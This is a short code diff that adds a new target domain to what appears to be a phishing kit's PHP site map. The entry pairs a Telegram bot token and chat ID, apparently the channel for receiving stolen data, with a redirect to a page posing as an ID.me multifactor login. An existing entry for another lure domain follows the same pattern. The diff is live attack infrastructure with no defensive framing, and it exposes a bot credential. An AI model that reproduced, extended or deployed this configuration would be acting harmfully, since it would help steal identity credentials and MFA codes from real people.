@@ -111,6 +111,21 @@ $site_map = [
         ],
         "redirect" => "https://illuminatisacred.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
     ],
+
+
+
+    'crediblely.netlify.app' => [
+        'bots' => [
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
+            ['token' => '', 'chat_id' => '']
+        ],
+        'redirect' => 'https://crediblely.netlify.app/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
+    ],
+
+
+
+
+
 ];
 
 // ============================================
